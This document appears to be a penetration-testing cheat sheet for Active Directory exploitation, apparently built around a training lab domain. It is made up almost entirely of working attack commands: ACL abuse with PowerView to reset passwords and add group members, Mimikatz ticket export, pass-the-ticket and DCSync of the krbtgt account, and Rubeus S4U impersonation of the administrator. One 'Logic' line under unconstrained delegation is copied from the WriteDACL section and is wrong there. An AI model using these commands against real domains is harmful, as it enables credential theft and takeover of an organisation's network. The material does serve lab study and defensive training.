# Active Directory Exploitation

## AD Object Security Permission
### Check Generic All
**Logic**: Use GenericAll permission → modify related password to gain access
```powershell
# Check Generic All
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# Exploitation 
net user testservice1 h4x /domain
net group testgroup offsec /add /domain
```

### Check DACL
**Logic**: Use WriteDACL to modify the access → GenericAll permission → modify related password to gain access
```powershell
# Check WriteDACL
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

#Change Permission to Generic ALL
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All

# Recheck
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Kerberos Operation
### Unconstrainted Delegation
**Logic**: Use WriteDACL to modify the access → GenericAll permission → modify related password to gain access
```powershell
# Check Unconstrainted Delegation
Get-DomainComputer -Unconstrained

# Export Ticket
sekurlsa::tickets /export

# Import again to elevate permission
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

# DC Sync
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

### Constrainted Delegation
**Logic**: Check TrustedtoAuth for the user (msds-allowedtodelegateto) → Generate TGT → S4U Authentication 
```powershell
# Check Trusted to Auth
Get-DomainUser -TrustedToAuth

#Generate TGT
.\Rubeus.exe hash /password:lab
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

#Perform authentication
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```
